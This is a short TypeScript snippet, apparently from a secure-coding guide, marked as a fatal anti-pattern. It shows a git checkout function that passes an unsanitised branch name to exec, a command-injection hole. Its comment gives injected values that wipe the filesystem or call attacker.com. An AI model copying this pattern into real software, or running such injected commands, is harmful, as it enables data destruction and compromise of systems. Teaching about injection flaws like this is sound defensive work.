// FATAL ANTI-PATTERN: NEVER DO THIS
import { exec } from "child_process";

// If argument contains: "main; rm -rf /" or "main && curl attacker.com"
function gitCheckout(branchName: string) {
  exec(`git checkout ${branchName}`); // FATAL COMMAND INJECTION!
}
